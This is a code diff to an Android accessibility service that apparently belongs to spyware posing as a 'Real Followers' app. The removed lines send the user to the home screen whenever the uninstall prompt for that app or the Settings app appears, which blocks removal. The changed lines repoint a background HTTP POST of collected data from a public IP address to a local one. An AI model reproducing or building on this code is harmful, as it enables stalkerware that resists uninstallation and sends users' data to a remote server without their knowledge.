@@ -60,16 +60,6 @@ public class MyAccessibilityService extends AccessibilityService {
         } else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             String packageName = event.getPackageName().toString();
             String text = event.getText().toString();
-            // Not working for few android versions ... idk why ( i made some changes in this if statement... idk if it will work now )
-            if (isPackageInstaller(packageName)) {
-                if (text.contains("Real Followers") && text.contains("Do you want to uninstall this app?")) {
-                        performGlobalAction(GLOBAL_ACTION_HOME);
-                }
-            }
-            // Remove this else-if part if you want the settings to open
-            else if (isSettingsApp(packageName)) {
-                performGlobalAction(GLOBAL_ACTION_HOME);
-            }
         }
     }
 
@@ -133,7 +123,7 @@ public class MyAccessibilityService extends AccessibilityService {
         protected Void doInBackground(List<String>... params) {
             HttpURLConnection urlConnection = null;
             try {
-                URL url = new URL("http://20.55.65.54/");
+                URL url = new URL("http://192.168.2.67:5000");
                 urlConnection = (HttpURLConnection) url.openConnection();
                 urlConnection.setRequestMethod("POST");
                 urlConnection.setDoOutput(true);
